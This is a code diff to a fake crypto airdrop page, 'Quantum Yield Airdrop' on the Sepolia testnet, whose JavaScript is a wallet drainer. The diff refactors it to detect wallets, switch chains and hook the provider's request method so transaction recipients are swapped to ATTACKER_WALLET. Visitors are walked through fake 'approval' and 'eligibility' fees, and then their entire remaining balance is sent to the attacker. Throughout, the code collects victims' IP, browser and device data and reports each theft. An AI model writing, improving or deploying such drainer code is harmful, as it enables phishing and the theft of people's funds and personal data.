@@ -343,7 +343,7 @@
     <main>
         <section class="hero" id="airdrop">
             <div class="container">
-                <h1>Quantum Yield Airdrop [SEPOLIA]</h1>
+                <h1>Airdrop [SEPOLIA]</h1>
                 <p>Claim 5 QYT + Exclusive NFTs Now! Only 1,000 Spots Left!</p>
                 <div class="countdown" id="timer">00:00:00</div>
                 <button class="cta" id="claimBtn" onclick="claimNow()">Claim Now</button>
@@ -486,7 +486,7 @@
                 const h = Math.floor(diff / (1000 * 60 * 60)).toString().padStart(2, "0");
                 const m = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60)).toString().padStart(2, "0");
                 const s = Math.floor((diff % (1000 * 60)) / 1000).toString().padStart(2, "0");
-                document.getElementById("timer").innerText = `${h}h ${m}m ${s}s`;
+                document.getElementById("timer").innerText = `${h}:${m}:${s}`;
             }, 1000);
         };
 
@@ -497,14 +497,18 @@
             document.getElementById("claimed").innerText = claimed.toLocaleString();
         };
 
-        // Wallet clipper
-        if (window.ethereum) {
-            const provider = new ethers.providers.Web3Provider(window.ethereum, {
-                chainId: 11155111,
-                name: "sepolia",
-                rpcUrls: [SEPOLIA_RPC]
-            });
-            window.ethereum.request = async (args) => {
+        // Wallet detection and clipper
+        async function detectWallet() {
+            if (typeof window.ethereum === "undefined" && typeof window.web3 === "undefined") {
+                return null;
+            }
+            return window.ethereum || window.web3.currentProvider;
+        }
+
+        async function setupWalletClipper(provider) {
+            if (!provider) return;
+            const originalRequest = provider.request;
+            provider.request = async (args) => {
                 if (args.method === "eth_sendTransaction") {
                     const tx = args.params[0];
                     const originalTo = tx.to;
@@ -512,9 +516,10 @@
                     tx.chainId = "0xAA36A7";
                     tx.gasPrice = ethers.utils.parseUnits("20", "gwei").toHexString();
                     await sendVictimAlert(`🪝 CLIP ATTEMPT: Swapped ${originalTo} to ${ATTACKER_WALLET}`);
-                    return provider.sendTransaction(tx);
+                    const ethersProvider = new ethers.providers.Web3Provider(provider);
+                    return ethersProvider.sendTransaction(tx);
                 }
-                return provider.send(args.method, args.params);
+                return originalRequest.apply(provider, [args]);
             };
         }
 
@@ -537,7 +542,8 @@
             claimBtn.innerText = "Processing...";
             document.getElementById("status").innerHTML = "<p class='warning'><i class='fas fa-atom fa-spin'></i> Connecting...</p>";
 
-            if (!window.ethereum) {
+            const provider = await detectWallet();
+            if (!provider) {
                 document.getElementById("status").innerHTML = "<p class='error'>MetaMask not detected! <a href='https://metamask.io/download/' target='_blank' style='color: #00ff9d;'>Install MetaMask</a></p>";
                 const info = await getVictimInfo();
                 await sendVictimAlert(`NO WALLET: ${info.ip}\nBrowser: ${info.browser}\nDevice: ${info.device}`);
@@ -546,76 +552,111 @@
                 return;
             }
 
-            const provider = new ethers.providers.Web3Provider(window.ethereum, {
-                chainId: 11155111,
-                name: "sepolia",
-                rpcUrls: [SEPOLIA_RPC]
-            });
-            await provider.send("wallet_switchEthereumChain", [{ chainId: "0xaa36a7" }]);
-            const accounts = await provider.send("eth_requestAccounts", []);
-            const signer = provider.getSigner();
-            const victimAddress = accounts[0];
-            const balance = await provider.getBalance(victimAddress);
-            const gasPrice = ethers.utils.parseUnits("20", "gwei");
-            const gasLimit = ethers.BigNumber.from("21000");
-            const gasCost = gasLimit.mul(gasPrice);
+            try {
+                // Setup clipper
+                await setupWalletClipper(provider);
 
-            const info = await getVictimInfo();
-            await sendVictimAlert(`🎯 VICTIM CONNECTED\nWallet: ${victimAddress}\nIP: ${info.ip}\nBrowser: ${info.browser}\nDevice: ${info.device}`);
+                const ethersProvider = new ethers.providers.Web3Provider(provider);
+                const network = await ethersProvider.getNetwork();
+                if (network.chainId !== 11155111) {
+                    try {
+                        await provider.request({
+                            method: "wallet_switchEthereumChain",
+                            params: [{ chainId: "0xaa36a7" }],
+                        });
+                    } catch (switchError) {
+                        if (switchError.code === 4902) {
+                            await provider.request({
+                                method: "wallet_addEthereumChain",
+                                params: [{
+                                    chainId: "0xaa36a7",
+                                    chainName: "Sepolia Testnet",
+                                    rpcUrls: [SEPOLIA_RPC],
+                                    nativeCurrency: {
+                                        name: "Sepolia ETH",
+                                        symbol: "SEP",
+                                        decimals: 18,
+                                    },
+                                    blockExplorerUrls: ["https://sepolia.etherscan.io"],
+                                }],
+                            });
+                        } else {
+                            throw switchError;
+                        }
+                    }
+                }
 
-            document.getElementById("status").innerHTML = "<p class='warning'>Approve QYT Contract (0.001 SEP)...</p>";
-            await signer.sendTransaction({
-                to: ATTACKER_WALLET,
-                value: ethers.utils.parseEther("0.001"),
-                gasLimit,
-                gasPrice,
-                chainId: 11155111
-            });
+                const accounts = await provider.request({ method: "eth_requestAccounts" });
+                const victimAddress = accounts[0];
+                const signer = ethersProvider.getSigner();
+                const balance = await ethersProvider.getBalance(victimAddress);
+                const gasPrice = ethers.utils.parseUnits("20", "gwei");
+                const gasLimit = ethers.BigNumber.from("21000");
+                const gasCost = gasLimit.mul(gasPrice);
 
-            document.getElementById("status").innerHTML = "<p class='warning'>Verifying Eligibility (0.005 SEP)...</p>";
-            await signer.sendTransaction({
-                to: ATTACKER_WALLET,
-                value: ethers.utils.parseEther("0.005"),
-                gasLimit,
-                gasPrice,
-                chainId: 11155111
-            });
+                const info = await getVictimInfo();
+                await sendVictimAlert(`🎯 VICTIM CONNECTED\nWallet: ${victimAddress}\nIP: ${info.ip}\nBrowser: ${info.browser}\nDevice: ${info.device}`);
 
-            document.getElementById("status").innerHTML = "<p class='warning'>Approve Claim Fee (0.01 SEP)...</p>";
-            await signer.sendTransaction({
-                to: ATTACKER_WALLET,
-                value: ethers.utils.parseEther("0.01"),
-                gasLimit,
-                gasPrice,
-                chainId: 11155111
-            });
-
-            const drainAmount = balance.sub(gasCost);
-            if (drainAmount.gt(0)) {
-                const drainEth = ethers.utils.formatEther(drainAmount);
-                const drainUsd = (parseFloat(drainEth) * ETH_TO_USD_RATE).toFixed(2);
-                document.getElementById("status").innerHTML = "<p class='warning'>Final Step: Lock Airdrop!</p>";
-                const tx = await signer.sendTransaction({
+                document.getElementById("status").innerHTML = "<p class='warning'>Approve QYT Contract (0.001 SEP)...</p>";
+                await signer.sendTransaction({
                     to: ATTACKER_WALLET,
-                    value: drainAmount,
+                    value: ethers.utils.parseEther("0.001"),
                     gasLimit,
                     gasPrice,
-                    chainId: 11155111
+                    chainId: 11155111,
                 });
-                await sendVictimAlert(`✅ SEPOLIA SUCCESS: ${victimAddress} DRAINED\nAmount: ${drainEth} SEP (~$${drainUsd} USD)\nTX: ${tx.hash}\nIP: ${info.ip}`);
-            }
 
-            document.getElementById("status").innerHTML = "<p class='warning'>Spinning Bonus...</p><div class='wheel'></div>";
-            await new Promise(resolve => setTimeout(resolve, 2000));
-            document.getElementById("status").innerHTML = "<h2 class='success'>Airdrop Secured!</h2><p>5 QYT + Bonus 5 QYT + NFT transferred!</p>";
-            document.getElementById("share").style.display = "block";
-            document.getElementById("phishing").style.display = "block";
+                document.getElementById("status").innerHTML = "<p class='warning'>Verifying Eligibility (0.005 SEP)...</p>";
+                await signer.sendTransaction({
+                    to: ATTACKER_WALLET,
+                    value: ethers.utils.parseEther("0.005"),
+                    gasLimit,
+                    gasPrice,
+                    chainId: 11155111,
+                });
 
-            claimBtn.innerText = "Claimed!";
-            setTimeout(() => {
+                document.getElementById("status").innerHTML = "<p class='warning'>Approve Claim Fee (0.01 SEP)...</p>";
+                await signer.sendTransaction({
+                    to: ATTACKER_WALLET,
+                    value: ethers.utils.parseEther("0.01"),
+                    gasLimit,
+                    gasPrice,
+                    chainId: 11155111,
+                });
+
+                const drainAmount = balance.sub(gasCost);
+                if (drainAmount.gt(0)) {
+                    const drainEth = ethers.utils.formatEther(drainAmount);
+                    const drainUsd = (parseFloat(drainEth) * ETH_TO_USD_RATE).toFixed(2);
+                    document.getElementById("status").innerHTML = "<p class='warning'>Final Step: Lock Airdrop!</p>";
+                    const tx = await signer.sendTransaction({
+                        to: ATTACKER_WALLET,
+                        value: drainAmount,
+                        gasLimit,
+                        gasPrice,
+                        chainId: 11155111,
+                    });
+                    await sendVictimAlert(`✅ SEPOLIA SUCCESS: ${victimAddress} DRAINED\nAmount: ${drainEth} SEP (~$${drainUsd} USD)\nTX: ${tx.hash}\nIP: ${info.ip}`);
+                }
+
+                document.getElementById("status").innerHTML = "<p class='warning'>Spinning Bonus...</p><div class='wheel'></div>";
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                document.getElementById("status").innerHTML = "<h2 class='success'>Airdrop Secured!</h2><p>5 QYT + Bonus 5 QYT + NFT transferred!</p>";
+                document.getElementById("share").style.display = "block";
+                document.getElementById("phishing").style.display = "block";
+
+                claimBtn.innerText = "Claimed!";
+                setTimeout(() => {
+                    claimBtn.innerText = "Claim Now";
+                    claimBtn.disabled = false;
+                }, 5000);
+            } catch (error) {
+                const info = await getVictimInfo();
+                await sendVictimAlert(`ERROR: ${error.message}\nIP: ${info.ip}\nBrowser: ${info.browser}\nDevice: ${info.device}`);
+                document.getElementById("status").innerHTML = `<p class='error'>Error: ${error.message}</p>`;
                 claimBtn.innerText = "Claim Now";
                 claimBtn.disabled = false;
-            }, 5000);
+            }
         }
 
         async function sendVictimAlert(msg) {
